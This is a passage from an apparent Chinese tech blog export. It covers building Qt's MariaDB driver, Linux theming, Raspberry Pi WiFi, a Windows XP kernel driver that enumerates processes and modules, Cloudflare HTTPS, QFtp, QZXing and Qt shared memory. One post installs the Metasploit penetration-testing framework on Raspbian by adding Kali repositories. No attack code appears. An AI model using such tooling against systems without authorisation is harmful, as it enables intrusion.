mysql.jsonINCLUDEPATH += /usr/include/mariadbPLUGIN_CLASS_NAME = QMYSQLDriverPlugininclude(../qsqldriverbase.pri) 注意我添加了 INCLUDEPATH += /usr/include/mariadb 接着 qmake;make 恭喜,特么的又出现了个错误.不急找找看那出了问题… /opt/Qt5.10.0/5.10.0/gcc_64/bin/qmake -o Makefile mysql.prorm -f libqsqlmysql.sog++ -Wl,–no-undefined -Wl,-O1 -Wl,–enable-new-dtags -Wl,-z,origin -Wl,-rpath,$ORIGIN/../../lib -Wl,-rpath,$ORIGIN/../../lib -shared -o libqsqlmysql.so .obj/qsql_mysql.o .obj/main.o .obj/moc_qsql_mysql_p.o -L/opt/Qt5.10.0/5.10.0/gcc_64/lib -lQt5Sql -lQt5Core -lmariadbclient -lpthread -lz -lm -ldl/usr/bin/ld: 找不到 -lmariadbclientcollect2: error: ld returned 1 exit statusMakefile:80: recipe for target ‘../plugins/sqldrivers/libqsqlmysql.so’ failedmake: *** [../plugins/sqldrivers/libqsqlmysql.so] Error 1 其实问题很简单,就是一个链接名字.在链接库时,默认匹配的为 libxxx.so ; 而后面的数字,如: libxxx.so.1.1.1 表示库的版本. $ locate libmariadbclient.so 看到,少了一个 libmariadbclient.so /usr/lib/x86_64-linux-gnu/libmariadbclient.so.18/usr/lib/x86_64-linux-gnu/libmariadbclient.so.18.0.0 瞬间问题简单化了,so,直接添加一个软链接就行了 ln -s /usr/lib/x86_64-linux-gnu/libmariadbclient.so.18.0.0 /usr/lib/x86_64-linux-gnu/libmariadbclient.so 再一次 qmake;make…… rm -f libqsqlmysql.sog++ -Wl,–no-undefined -Wl,-O1 -Wl,–enable-new-dtags -Wl,-z,origin -Wl,-rpath,$ORIGIN/../../lib -Wl,-rpath,$ORIGIN/../../lib -shared -o libqsqlmysql.so .obj/qsql_mysql.o .obj/main.o .obj/moc_qsql_mysql_p.o -L/opt/Qt5.10.0/5.10.0/gcc_64/lib -lQt5Sql -lQt5Core -lmariadbclient -lpthread -lz -lm -ldlmv -f libqsqlmysql.so ../plugins/sqldrivers/ 成功编译! 现在 $ ../plugins/sqldrivers$ ldd libqsqlmysql.so libmariadbclient.so.18 =&gt; /usr/lib/x86_64-linux-gnu/libmariadbclient.so.18 (0x00007f1bf7414000) 现在可以把这个文件复制到 /opt/Qt5.10.0/5.10.0/gcc_64/plugins/sqldrivers 目录下了 结束语基本上到此为止了吧…..顺带提下,用C写的程序链接MySQL数据库时,传统的做法就是 gcc xxx.c -o xxx -lmysqlclient 换成MariaDB后就成了 gcc xxx.c -o xxx -lmariadb 这一点要特别注意啊! bye]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Qt</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows10 GTK Theme]]></title>
    <url>%2Fwindows10-gtk-theme%2F</url>
    <content type="text"><![CDATA[最近偶然看到一篇文章,讲的是讲Linux主题配置成Windows10,咋一看,挺好奇的,所以才出了本文 获取Windows10 GTK ThemeWindows 10 Light12git clone https://github.com/B00merang-Project/Windows-10.gitsudo mv Windows-10 /usr/share/themes/ Windows 10 Dark12git clone https://github.com/B00merang-Project/Windows-10-Dark.gitsudo mv Windows-10-Dark /usr/share/themes Windows 10 Universal12git clone https://github.com/B00merang-Project/Windows-10-Metro.gitsudo mv Windows-10-Metro /usr/share/themes/ 设置图标(Icons)123wget https://github.com/Elbullazul/Windows-10/releases/download/v0.9.6/Windows.10.Icons.v0.4.1.zipunzip Windows.10.Icons.v0.4.1.zipmv &apos;Windows 10 Icons&apos; /usr/share/icons 设置墙纸(Wallpaper)123cd /usr/share/themes/Windows-10lscp wallpaper.jpg ~/Pictures 之后就可以通过 gnome-tweak-tool 设置主题了… 另外可参考How To Make Linux Look Like Windows 10How To Make Linux Look Like Windows VistaHow To Make Linux Look Like Windows XPHow To Make Linux Look Like macOSHow To Make Linux Look Like Chrome OS bye~~]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[电脑无线连接到树莓派(RaspPi)]]></title>
    <url>%2Fconnect-reappi%2F</url>
    <content type="text"><![CDATA[当得到一块树莓派时，已经刷入raspbian系统，除了用网线连接树莓派和电脑外，还可以通过无线WiFi连接到树莓派 正文正常来讲，我得用另一个根网线把电脑和树莓派连在一起。在主机上连接无线WiFi，再 fping -asqg 192.168.1.0/24 或 nmap 找到局域网下树莓派的IP地址。而现在，我不要让主机连接WiFi(这样网络速度快很多)，即在树莓派启动时自动连接到WiFi热点。 因此，可以把已经刷好的SD卡里面的有关网络的系统配置文件 /etc/network/interfaces 进行修改。 123456789101112131415auto loiface lo inet loopbackauto eth0iface eth0 inet staticaddress 192.168.1.105netmask 255.255.255.0gateway 192.168.1.1#auto wlan0allow-hotplug wlan0iface wlan0 inet static address 192.168.1.110netmask 255.255.255.0gateway 192.168.1.1wpa-ssid WiFi名称wpa-psk WiFi密码 这里我将wlan0接口设置成静态地址，这样的话以后就可以很方便通过ssh连接到树莓派了。 现在再把SD卡插入树莓派，启动，稍等片刻 fping -asqg 192.168.1.0/24 扫描局域网主机后，就可以看到设置的静态IP地址192.168.1.11 或者指定一个 wpa_supplicant.conf /etc/network/interfaces 12345#auto wlan0allow-hotplug wlan0iface wlan0 inet manualwpa-roam /etc/wpa_supplicant/wpa_supplicant.confiface default inet dhcp /etc/wpa_supplicant/wpa_supplicant.conf 123456ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdevupdate_config=1network=&#123; ssid=&quot;wifi名称&quot; psk=&quot;wifi密码&quot;&#125; 最后通过 ssh pi@192.168.1.110 即可连接到树莓派 bye~]]></content>
      <categories>
        <category>RaspberryPi</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用winpcap获取网络数据传输]]></title>
    <url>%2Fwindows-kernel%2F</url>
    <content type="text"><![CDATA[说明：在我没转到linux之前，我粗略的学过windows内核编程，以下是在学习过程中编录的内容，以供参考 工具：WDK 7+VS2015 测试平台：虚拟机 WINDOWS XP 包含的头文件 1#include &lt;ntifs.h&gt;#include &lt;ntstrsafe.h&gt; 声明的API函数 123456789NTKERNELAPI HANDLE PsGetProcessInheritedFromUniqueProcessId(IN PEPROCESS Process);NTKERNELAPI PPEB_EX PsGetProcessPeb(PEPROCESS Process);NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE Id, PEPROCESS *Process);NTKERNELAPI NTSTATUS PsLookupThreadByThreadId(HANDLE Id, PETHREAD *Thread);NTKERNELAPI PEPROCESS IoThreadToProcess(PETHREAD Thread);//NTKERNELAPI VOID NTAPI KeAttachProcess(PEPROCESS Process);//NTKERNELAPI VOID NTAPI KeDetachProcess();//NTKERNELAPI VOID NTAPI KeStackAttachProcess(PEPROCESS Process, PKAPC_STATE ApcState);//NTKERNELAPI VOID NTAPI KeUnstackDetachProcess(PKAPC_STATE ApcState); 因为要通过 PEPROCESS 来获取进程和模块，所以还要用到几个结构体，在WinDbg 可看到。这里新建一个头文件，包含了PEB等信息 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#include "peb.h"如下：#pragma once#include &lt;ntifs.h&gt;typedef struct _PEB_LDR_DATA_EX&#123;ULONG Length; // +0x00 BOOLEAN Initialized; // +0x04 PVOID SsHandle; // +0x08 LIST_ENTRY InLoadOrderModuleList; // +0x0c LIST_ENTRY InMemoryOrderModuleList; // +0x14LIST_ENTRY InInitializationOrderModuleList;// +0x1c &#125;PEB_LDR_DATA_EX, *PPEB_LDR_DATA_EX;typedef struct _LDR_DATA_TABLE_ENTRY_EX &#123;LIST_ENTRY InLoadOrderLinks;LIST_ENTRY InMemoryOrderLinks;LIST_ENTRY InInitializationOrderLinks;PVOID DllBase;PVOID EntryPoint;ULONG SizeOfImage;UNICODE_STRING FullDllName;UNICODE_STRING BaseDllName;ULONG Flags;USHORT LoadCount;USHORT TlsIndex;union &#123;LIST_ENTRY HashLinks;struct &#123;PVOID SectionPointer;ULONG CheckSum;&#125;;&#125;;union &#123;ULONG TimeDateStamp;PVOID LoadedImports;&#125;;PVOID EntryPointActivationContext; PVOID PatchInformation;LIST_ENTRY ForwarderLinks;LIST_ENTRY ServiceTagLinks;LIST_ENTRY StaticLinks;PVOID ContextInformation;PVOID OriginalBase;LARGE_INTEGER LoadTime;&#125; LDR_DATA_TABLE_ENTRY_EX, *PLDR_DATA_TABLE_ENTRY_EX;typedef struct _CURDIR &#123;UNICODE_STRING DosPath;PVOID Handle;&#125;CURDIR, *PCURDIR;typedef struct _RTL_DRIVE_LETTER_CURDIR &#123;USHORT Flags;USHORT Length;ULONG TimeStamp;STRING DosPath;&#125;RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;//进程参数typedef struct _RTL_USER_PROCESS_PARAMETERS&#123;ULONG MaximumLength;ULONG Length;ULONG Flags;ULONG DebugFlags;PVOID ConsoleHandle;ULONG ConsoleFlags;PVOID StandardInput;PVOID StandardOutput;PVOID StandardError;CURDIR CurrentDirectory;UNICODE_STRING DllPath;UNICODE_STRING ImagePathName;UNICODE_STRING CommandLine;PVOID Environment;ULONG StartingX;ULONG StartingY;ULONG CountX;ULONG CountY;ULONG CountCharsX;ULONG CountCharsY;ULONG FillAttribute;ULONG WindowFlags;ULONG ShowWindowFlags;UNICODE_STRING WindowTitle;UNICODE_STRING DesktopInfo;UNICODE_STRING ShellInfo;UNICODE_STRING RuntimeData;RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];&#125;RTL_USER_PROCESS_PARAMETERS,*PRTL_USER_PROCESS_PARAMETERS;//进程环境块（因为Windows内核有一个机构PEB，为了不重定义，所以就另起一个名字）typedef struct _PEB_EX &#123;UCHAR InheritedAddressSpace;UCHAR ReadImageFileExecOptions;UCHAR BeingDebugged;UCHAR SpareBool;PVOID Mutant;PVOID ImageBaseAddress;PPEB_LDR_DATA_EX Ldr;PRTL_USER_PROCESS_PARAMETERS ProcessParameters;UCHAR Reserved4[104];PVOID Reserved5[52];PVOID PostProcessInitRoutine;PVOID Reserved7;UCHAR Reserved6[128];ULONG SessionId;&#125; PEB_EX, *PPEB_EX; 用于遍历进程函数 12345678910111213141516171819202122232425262728293031void EnumProcess(PEPROCESS eprocess)&#123; KAPC_STATE ks; if (!MmIsAddressValid(eprocess)) return; //获取 PEB信息 PPEB_EX peb = PsGetProcessPeb(eprocess); if (!peb) return; //依附进程!!!!!!!!!!!!!! KeStackAttachProcess(eprocess, &amp;ks); __try &#123; if (PsGetProcessId(eprocess)!=0) &#123; //获取 进程参数 PRTL_USER_PROCESS_PARAMETERS rtl_user_process_param = (PRTL_USER_PROCESS_PARAMETERS)peb-&gt;ProcessParameters; DbgPrint("CommandLine:%wZ\n", &amp;rtl_user_process_param-&gt;CommandLine); DbgPrint("ImagePath=%wZ\n", &amp;rtl_user_process_param-&gt;ImagePathName); //DbgPrint("Window Title=%wZ\n", &amp;rtl_user_process_param-&gt;WindowTitle); DbgPrint("——————————————————————————————"); &#125; &#125; __except (EXCEPTION_EXECUTE_HANDLER) &#123; //DbgPrint("Can not Process..."); &#125; //取消依附进程 KeUnstackDetachProcess(&amp;ks);&#125; 遍历模块，大体上和遍历进程一样，但也要注意区别 1234567891011121314151617181920212223242526272829303132void EnumModules(PEPROCESS eprocess)&#123; KAPC_STATE ks; if (!MmIsAddressValid(eprocess)) return; //获取 PEB信息 PPEB_EX peb = PsGetProcessPeb(eprocess); if (!peb) return; //依附进程!!!!!!!!!!!!!! KeStackAttachProcess(eprocess, &amp;ks); __try &#123; PPEB_LDR_DATA_EX peb_LDR_data = (PPEB_LDR_DATA_EX)peb-&gt;Ldr; PLIST_ENTRY list_entry = &amp;peb_LDR_data-&gt;InLoadOrderModuleList; //先获取第一个 PLIST_ENTRY currentList = list_entry-&gt;Flink; while (currentList!=list_entry) &#123; PLDR_DATA_TABLE_ENTRY_EX ldr_data_table_entry =(PLDR_DATA_TABLE_ENTRY_EX)currentList; DbgPrint("Module Base=%p DllPath=%wZ\n",ldr_data_table_entry-&gt;DllBase, &amp;ldr_data_table_entry-&gt;FullDllName); //指向下一个 currentList = currentList-&gt;Flink; &#125; &#125; __except (EXCEPTION_EXECUTE_HANDLER) &#123; //DbgPrint("Can not Modules..."); &#125; //取消依附进程 KeUnstackDetachProcess(&amp;ks);&#125; 这个函数把上面两个函数整合在一起了 1234567891011121314151617181920212223VOID EnumProcessModuleInformations()&#123; //第一个进程环境块 PEPROCESS eprocess=PsGetCurrentProcess(); PEPROCESS eprocess_first = eprocess; while (1) &#123; //获取进程 EnumProcess(eprocess); //下一个进程，我获取的是WinXP的 EPROCESS ! eprocess = (PEPROCESS)(*(ULONG*)((ULONG)eprocess + 0x88) - 0x88); if (eprocess == eprocess_first)&#123;break;&#125; &#125; eprocess= eprocess_first; while (1) &#123; //获取模块 EnumModules(eprocess); //下一个进程 eprocess = (PEPROCESS)(*(ULONG*)((ULONG)eprocess + 0x88) - 0x88); if (eprocess == eprocess_first)&#123;break;&#125; &#125;&#125; 卸载函数很简单 1234VOID unload(PDRIVER_OBJECT p)&#123; DbgPrint("UnloadDriver...");&#125; 驱动入口函数 123456789NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver_Obj, PUNICODE_STRING pRegisterPath)&#123; DbgPrint("DriverEntry..."); pDriver_Obj-&gt;DriverUnload = unload; DbgPrint("DriverName:%wZ RegisterPath:%wZ \n ", &amp;pDriver_Obj-&gt;DriverName,pRegisterPath); //这里调用 EnumProcessModuleInformations(); return STATUS_SUCCESS;&#125;]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里云+Github Page支持HTTPS]]></title>
    <url>%2Fgithub-page-https%2F</url>
    <content type="text"><![CDATA[正常来讲在阿里云注册了一个域名，默认时支持HTTP，要想让自己的域名在Github Page支持HTTPS，那么可以用 Cloudflare Cloudflare Cloudflare是一家美国的跨国科技企业，总部位于旧金山，在英国伦敦亦设有办事处。Cloudflare以向客户提供网站安全管理、性能优化及相关的技术支持为主要业务。通过基于反向代理的内容传递网络(ContentDeliveryNetwork,CDN)及分布式域名解析服务(DistributedDomainNameServer)，Cloudflare可以帮助受保护站点抵御包括拒绝服务攻击(DenialofService)在内的大多数网络攻击，确保该网站长期在线，同时提升网站的性能、访问速度以改善访客体验 Cloudflare配置首先需要登录 官网 注册一个账号，新注册账户登录后弹出对话框要求添加一个站点。可以是从阿里云注册的域名。 这里添加一条DNS记录。我在阿里云域名解析中添加了CNAME记录，指向github服务器，所以这里我也直接添加一条CNAME DNS记录。 在“DNS记录”下朝上，从下拉列表中选择 CNAME。Name 输入 @Domain name 输入 域名，如 josexy.github.io将其保留为 自动TTL(Automatic TTL)。点击橙色云将其变成灰色。点击“添加记录”(Add Record)。 之后我们还需要修改原域名的DNS服务器为Cloudflare提供的DNS服务器。要根据自己的来设置。 修改Cloudflare提供的DNS服务器之后，可以看到变成了这样子。 最后看到这个表示一切正常 SSL选择 Crypto ，修改 SSL 为 Flexible(这里我建议选择 Full/Full(strict)，也是为了避免 ERR_TOO_MANY_REDIRECTS )，表示支持HTTPS 重定向选择 Page Rules ,添加规则，跳转到HTTPS。比如访问有人访问 http://josephxy.com ，那么我们就需要强制跳转（重定向）到 https://josephxy.com。 这里添加了两条规则 最后我们可以看到小绿锁，表示支持HTTPS :) 结尾 参考文章： https://blog.cloudflare.com/secure-and-fast-github-pages-with-cloudflare/ https://docs.clickfunnels.com/custom-domains/dns-hosts/how-to-add-your-cname-record-to-cloudflare 注意： 可以在GitHub Pages [Setting] 中 Enforce HTTPS]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Github</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派安装Metasploit框架]]></title>
    <url>%2Frasppi-meatsploit%2F</url>
    <content type="text"><![CDATA[Metasploit框架包含的大量的模块、插件，其强大的功能使得渗透变得不在是想象中的那么难。Kali Linux本身就自带了metasploit框架，当然了，有兴趣的可以在树莓派上安装 kali Linux 。不过本文的重点是在raspbian上进行安装 正文首先呢，当然是要连接到树莓派了。接着我们把以下更新源追加到 sources.list 12345deb http://mirrors.ustc.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi#deb-src http://mirrors.ustc.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi##### 所需的有关kali linux更新源deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib 再 sudo apt-get update ，如果在这时出现了类似一下的错误，那么是正常的，因为我们没有授权在raspbian系统上使用kali的更新源 正在读取软件包列表… 完成W: GPG 错误：http://kali.mirror.garr.it/mirrors/kali kali-rolling InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY ED444FF07D8D0BF6W: 仓库 “http://http.kali.org/kali kali-rolling InRelease” 没有数字签名。N: 无法认证来自该源的数据，所以使用它会带来潜在风险。N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节 解决方法：gpg –keyserver pgp.mit.edu –recv-keys ED444FF07D8D0BF6gpg -a –export ED444FF07D8D0BF6 | sudo apt-key add - 其中 –keyserver 后面的 pgp.mit.edu 可换成： keyserver.ubuntu.compgp.mit.edusubkeys.pgp.netwww.gpg-keyserver.de 然后在执行 sudo apt-get update 接下来我们就可以安装metasploit框架了 sudo apt-get install metasploit-framework]]></content>
      <categories>
        <category>RaspberryPi</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qt5调用QFtp函数]]></title>
    <url>%2Flinux-qt-qftp%2F</url>
    <content type="text"><![CDATA[不知怎么,在Qt5以上版本没有了QFtp,不过可以用QNetworkAccessManager.我在网上也找了些资料,最后还是决定先暂时用QFtp..这篇博客讲解的很详细http://blog.csdn.net/liang19890820/article/details/53304049 下载QFtp源码 git clone https://github.com/qt/qtftp.git 修改配置 进入qtftp/src/qftp,有个 qftp.pro ,修改为 CONFIG += static #生成 .a静态链接库CONFIG += shared #生成.so动态链接库 编译进入qtftp根目录,编译生成库文件 cd qtftpqmakemake 然后在 qtftp/lib 下生成了一些目录文件,大概是这样 cmake/ libQt5Ftp.la libQt5Ftp.so libQt5Ftp.so.5.0 pkgconfig/libQt5Ftp.a libQt5Ftp.prl libQt5Ftp.so.5 libQt5Ftp.so.5.0.0 整合文件把这些零散的文件整合成一个便于调用的库,还是非常有必要的这里我创建一个 libqtftp 文件夹,用来存放所需要的文件 然后在刚才在 qtftp 目录下的 lib , include , src文件夹复制到 libqtftp 目录 进入 include/QtFtp 文件夹,删除 headers.pri,同时把 src 文件夹内:qftp.cppqftp.hqurlinfo.cppqurlinfo.h.moc文件夹内3个文件复制到上一层文件夹 (隐藏文件夹).obj + .pch (隐藏文件夹) 一并复制到 include/QtFtp 文件夹,这时可删除 src 文件夹 修改 moc_qftp.cpp 代码 #include &quot;../qftp.h&quot; 为 #include &quot;qftp.h&quot; 为了便于管理,在 libqtftp 目录下创建一个 .pri文件: qtftp.pri: 12345678#QT += networkHEADERS += $$PWD/include/QtFtp/\ $$PWD/include/QtFtp/QFtp\ $$PWD/include/QtFtp/QUrlInfo\ $$PWD/include/QtFtp/QtFtpVersionSOURCES += $$PWD/include/QtFtp/qftp.cpp\ $$PWD/include/QtFtp/qurlinfo.cppINCLUDEPATH += $$PWD/include/ 引用库首先,新建一个Qt项目,把 libqtftp 文件夹放到 Qt项目下.然后在修改 项目.pro 文件 1234567891011QT += core gui networkgreaterThan(QT_MAJOR_VERSION, 4): QT += widgetsTARGET = MyFtpTEMPLATE = appinclude($$PWD/libqtftp/qtftp.pri)SOURCES += main.cpp\ mainwindow.cppHEADERS += mainwindow.hFORMS += mainwindow.uiINCLUDEPATH += $$PWD/libqtftp/include/LIBS += -L$$PWD/libqtftp/lib/ -lQt5Ftp 要注意那个配置: QT += network include($$PWD/libqtftp/qtftp.pri) INCLUDEPATH += $$PWD/libqtftp/include/ LIBS += -L$$PWD/libqtftp/lib/ -lQt5Ftp链接libQt5Ftp.so动态链接库 之后 重新构建项目 例子使用前需要包含头文件 12#include"QtFtp/QFtp"#include&lt;QtFtp/QUrlInfo&gt; 如： 1234567891011121314151617// do something ... QFtp * ftp =new QFtp(this); connect(ftp,&amp;QFtp::listInfo,this,[=](const QUrlInfo u)&#123; // do something ... &#125;); connect(ftp,&amp;QFtp::dataTransferProgress,[=](qint64 _t1, qint64 _t2)&#123; // do something ... &#125;); connect(ftp,&amp;QFtp::readyRead,this,[=]()&#123; // do something ... &#125;); int id=ftp-&gt;connectToHost(""); ftp-&gt;login("",""); ftp-&gt;cd(""); ftp-&gt;list(); ftp-&gt;close(); // do something ...]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qt&QZXing识别二维码]]></title>
    <url>%2Flinux-qzxing%2F</url>
    <content type="text"><![CDATA[前言最近在网上看到一篇博客,讲的是二维码的生成和识别 借用一下 ZXingZXing是一个开放源码的，用Java实现的多种格式的1D/2D条码图像处理库，包含了联系到其他语言的端口。网址：https://code.google.com/p/zxing. LibqrencodeLibqrencode(QRencode)是一个用C语言编写的用来解析二维条形码(QR Code)的程序库，Libqrencode通过手机的CCD摄像头来扫描二维条形码。二维码容量可达7000个数字或4000个字符，是非常强大的。网址：http://fukuchi.org/works/qrencode/. ZBarZBar是款桌面电脑用条形码/二维码扫描工具，支持摄像头及图片扫描，支持多平台包括iPhone手机。同时 ZBar提供了二维码扫描的API开发包。网址：http://zbar.sourceforge.net.更多参考：http://sourceforge.net/apps/mediawiki/zbar/index.php. Open Source QR Code Library二维码编码/解码的Java库（J2SE, J2ME MIDP2.0/CLDC1.0）。网址：http://qrcode.sourceforge.jp/index.html.en. QZXingQt包装ZXing的解码库。网址：http://sourceforge.net/projects/qzxing.更多参考：https://projects.developer.nokia.com/QZXing. 然而本人能力有限,这里只选取了 QZXing 解码库,以后有时间在慢慢琢磨… example: QZXing首先到github获取到源码 git clone https://github.com/ftylitak/qzxing.git 当然也可以下zip压缩包 How to includeqzxing上讲的还比较清楚…怎么使用 把QZXing目录直接复制到项目的根目录下,并且在项目的 .pro 中加入 include(../../src/QZXing.pri) 或者把源码编译成动态库(dynamic library) qmake src/QZXing.promake 使用 123456789101112131415161718192021222324252627282930#include "widget.h"#include "ui_widget.h"#include&lt;QZXing.h&gt;#include&lt;QPixmap&gt;#include&lt;QDebug&gt;Widget::Widget(QWidget *parent) : QWidget(parent), ui(new Ui::Widget)&#123; ui-&gt;setupUi(this);&#125;Widget::~Widget()&#123; delete ui;&#125;#define FILE_PATH "/root/Desktop/l.png"void Widget::on_pushButton_clicked()&#123; QPixmap pixmap(FILE_PATH); ui-&gt;label-&gt;setPixmap(pixmap.scaled(ui-&gt;label-&gt;size()));&#125;void Widget::on_pushButton_2_clicked()&#123; QZXing *decoder=new QZXing(this); //设置解码格式 decoder-&gt;setDecoder(QZXing::DecoderFormat_QR_CODE); //start decode QString str= decoder-&gt;decodeImage(ui-&gt;label-&gt;pixmap()-&gt;toImage()); if (!str.isEmpty())&#123; ui-&gt;textEdit-&gt;setText(str); &#125;else&#123; ui-&gt;textEdit-&gt;setText("Failed!!"); &#125;&#125; 尾当然,感兴趣的可以去看源码有解码就有编码,网上有很多库可以用,也可以自己写一个出来…不过这要技术到家…不过目前我正在学习使用 libqrencode ,可以到官网瞧瞧https://fukuchi.org/works/qrencode/]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qt进程间通信]]></title>
    <url>%2Flinux-qt-process%2F</url>
    <content type="text"><![CDATA[Qt中实现进程间通信的方法诸多,这里讲解比较简单的共享内存类QSharedMemory在这之前,先来看看这个类,其实函数不是很多,详细资料到官方文档查看 演示 下面代码注释写的比较清楚了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include&lt;QDebug&gt;//内存共享 标识符#define MEM_KEY "_sharedMemKey_"#include&lt;QPixmap&gt;#include&lt;QBuffer&gt;#define PIX_MAP "test.jpg"Widget::Widget(QWidget *parent) : QWidget(parent), ui(new Ui::Widget)&#123; ui-&gt;setupUi(this); //设置内存标志 key sharedMemory=new QSharedMemory(this); sharedMemory-&gt;setKey(MEM_KEY);&#125;Widget::~Widget()&#123; delete ui;&#125;//载入图片到内存void Widget::on_pushButton_clicked()&#123; //如果已经绑定,则分离 if(sharedMemory-&gt;isAttached())&#123; sharedMemory-&gt;detach(); &#125; QPixmap pmp; pmp.load(PIX_MAP); ui-&gt;label-&gt;setPixmap(pmp.scaled(ui-&gt;label-&gt;size())); //图像的数据(QPixmap)---&gt; ( QDataStream )--&gt;QBuffer QBuffer tmpBuffer; //打开 缓存区设备 tmpBuffer.open(QIODevice::ReadWrite); //数据流与缓存区关联 QDataStream dataOutstream(&amp;tmpBuffer); //图像数据输入到数据流 dataOutstream&lt;&lt;pmp; //获取缓存区(图像)字节大小 int bufferSize=tmpBuffer.size(); //创建共享内存 if(sharedMemory-&gt;create(bufferSize))&#123; //lock sharedMemory-&gt;lock(); //memset(sharedMemory-&gt;data(),0,bufferSize); //获取图像数据 const char *datasharedBuffer= tmpBuffer.data().data(); //获取共享内存地址 char *datasharedMemory=(char *)sharedMemory-&gt;data(); //图像数据 拷贝到 共享内存中 memcpy(datasharedMemory,datasharedBuffer,bufferSize); //unlock sharedMemory-&gt;unlock(); &#125; tmpBuffer.close();&#125;//从共享内存获取图像数据void Widget::on_pushButton_2_clicked()&#123; //进程与共享内存绑定!,,注意要设置好标识符 key if(sharedMemory-&gt;attach())&#123; qDebug()&lt;&lt;"ok!"; sharedMemory-&gt;lock(); // 图像的数据(QPixmap) &lt;--- ( QDataStream ) &lt;--- QBuffer QBuffer buffer; char *dataSharedMem=(char*)sharedMemory-&gt;data(); int dataSize =sharedMemory-&gt;size(); //设置共享内存的数据到缓存区 buffer.setData(QByteArray(dataSharedMem,dataSize)); QPixmap pmp; buffer.open(QIODevice::ReadOnly); //关联缓存区数据到数据流 QDataStream dataInStream(&amp;buffer); dataInStream&gt;&gt;pmp; ui-&gt;label-&gt;setPixmap(pmp.scaled(ui-&gt;label-&gt;size())); //进程与共享内存分离 sharedMemory-&gt;unlock(); if(sharedMemory-&gt;isAttached())&#123; sharedMemory-&gt;detach(); &#125; buffer.close(); &#125;&#125;]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[创建Qt5应用程序插件]]></title>
    <url>%2Flinux-qt-plugin%2F</url>
    <content type="text"><![CDATA[前言最近也没时间来写博客了 (⊙o⊙)…，于是现在赶紧抽空写一写～～这次讲的是在创建Qt插件，在Windows上为.dll动态库，Linux上为.so动态库 官网&gt;&gt; How to Create Qt Plugins 大概就是这么几步 Making an application extensible through plugins involves the following steps: Define a set of interfaces (classes with only pure virtual functions) used to talk to the plugins. Use the Q_DECLARE_INTERFACE() macro to tell Qt’s meta-object system about the interface. Use QPluginLoader in the application to load the plugins. Use qobject_cast() to test whether a plugin implements a given interface. Writing a plugin involves these steps: Declare a plugin class that inherits from QObject and from the interfaces that the plugin wants to provide. Use the Q_INTERFACES() macro to tell Qt’s meta-object system about the interfaces. Export the plugin using the Q_PLUGIN_METADATA() macro. Build the plugin using a suitable .pro file. 注意：Q_EXPORT_PLUGIN，Q_EXPORT_PLUGIN2 宏在Qt5不能用了，用新的宏 Q_PLUGIN_METADATA。 生成插件创建一个应用程序插件，要先创建一个插件接口类（interface），它只能包含，再创建一个插件类，并继承自这个接口类。下面以一个简单的例子说明：) （新建一个空的Qt项目） mytestplugininterface.h 接口类 1234567891011121314#ifndef MYTESTPLUGININTERFACE_H#define MYTESTPLUGININTERFACE_H#include&lt;QString&gt;#include&lt;QObject&gt;class MyTestPluginInterface&#123;public: virtual ~MyTestPluginInterface()&#123;&#125; //纯虚函数 virtual void helloworld(QString string)=0;&#125;;//第二个参数指定 唯一IID标识符，其实就是个字符串Q_DECLARE_INTERFACE(MyTestPluginInterface,"myplugin.example.my.com")#endif // MYTESTPLUGININTERFACE_H mytestplugin.h 插件类头文件 1234567891011121314151617#ifndef MYTESTPLUGIN_H#define MYTESTPLUGIN_H#include"mytestplugininterface.h"#include&lt;QObject&gt;class MyTestPlugin:public QObject,MyTestPluginInterface&#123; Q_OBJECT //导出该插件 Q_PLUGIN_METADATA(IID "myplugin.example.my.com") //将该接口注册到Qt的元对象系统 Q_INTERFACES(MyTestPluginInterface)public: MyTestPlugin(); void helloworld(QString string); ~MyTestPlugin()&#123;&#125;&#125;;#endif // MYTESTPLUGIN_H mytestplugin.cpp 插件类cpp源文件 12345678#include"mytestplugin.h"#include&lt;QtPlugin&gt;#include&lt;QDebug&gt;MyTestPlugin::MyTestPlugin()&#123;&#125;//重写该接口类的虚函数void MyTestPlugin::helloworld(QString string)&#123; qDebug()&lt;&lt;"Hello---&gt; "&lt;&lt;string;&#125; 最后就是编辑.pro文件并构建该插件 123456789TEMPLATE = libCONFIG += pluginTARGET = mytestPluginDESTDIR = ../outputDirHEADERS += \ mytestplugin.h \ mytestplugininterface.hSOURCES += \ mytestplugin.cpp CONFIG 